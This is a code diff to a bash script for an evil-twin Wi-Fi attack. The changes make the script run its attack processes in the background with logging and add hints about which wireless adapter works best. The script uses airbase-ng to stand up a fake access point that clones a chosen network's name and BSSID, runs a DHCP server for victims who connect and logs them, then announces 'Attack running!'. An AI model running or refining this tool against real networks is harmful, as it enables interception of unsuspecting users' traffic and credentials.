@@ -601,10 +601,15 @@ select_interface() {
 # Returns:
 #   None
 ###########################################
-open_terminal() {
+run_background() {
     local command=${1}
-    local title=${2}
-    xterm -hold -T "${title}" -e "${command}" > /dev/null 2>&1 &
+    local log_file="${TMP_DIR}/${2}.log"
+    mkdir -p "${TMP_DIR}"
+    if [ -x "$(command -v xterm)" ] && [ -n "${DISPLAY:-}" ]; then
+        xterm -hold -T "${2}" -e "${command}" > "${log_file}" 2>&1 &
+    else
+        nohup bash -c "${command}" > "${log_file}" 2>&1 &
+    fi
 }
 
 print_header() {
@@ -681,7 +686,8 @@ main() {
                     print_header
                     echo ""
                     echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Starting fake access point...${WHITE}"
-                    open_terminal "airbase-ng -e ${selected_essid} -a ${selected_bssid} -c ${selected_channel} ${wlan}" "Fake Access Point"
+                    echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Atheros AR9271 (ID 3) is best for fake AP. Intel 3165 may not support master mode.${WHITE}"
+                    run_background "airbase-ng -e ${selected_essid} -a ${selected_bssid} -c ${selected_channel} ${wlan}" "airbase-ng"
 
                     echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Waiting for at0 interface...${WHITE}"
                     local at0_timeout=10
@@ -691,8 +697,14 @@ main() {
                     done
 
                     if [ "$(ip -o link show at0 2>/dev/null)" = "" ]; then
-                        echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} at0 interface not created. Check if airbase-ng is running.${WHITE}"
-                        sleep 2
+                        echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} at0 interface not created. Check logs:${BOLD_YELLOW} ${TMP_DIR}/airbase-ng.log${WHITE}"
+                        if [ -f "${TMP_DIR}/airbase-ng.log" ]; then
+                            echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} airbase-ng output:${WHITE}"
+                            cat "${TMP_DIR}/airbase-ng.log"
+                        fi
+                        echo ""
+                        echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Use the Atheros AR9271 (ID 3) for the fake AP, not Intel 3165.${WHITE}"
+                        sleep 5
                         result='main'
                         continue
                     fi
@@ -716,7 +728,7 @@ main() {
                     fi
 
                     echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Starting DHCP server...${WHITE}"
-                    open_terminal "dhcpd -d -cf \"${TMP_DIR}/${DHCPD_FILE}\" at0 2>&1 | tee -a ${TMP_DIR}/clts.txt" "DHCP"
+                    run_background "dhcpd -d -cf \"${TMP_DIR}/${DHCPD_FILE}\" at0 2>&1 | tee -a ${TMP_DIR}/clts.txt" "dhcpd"
                     echo ""
                     echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Attack running! Fake AP: ${BOLD_YELLOW}${selected_essid}${GREEN} on ${BOLD_PURPLE}at0${WHITE}"
                     if [ -n "${lan}" ]; then
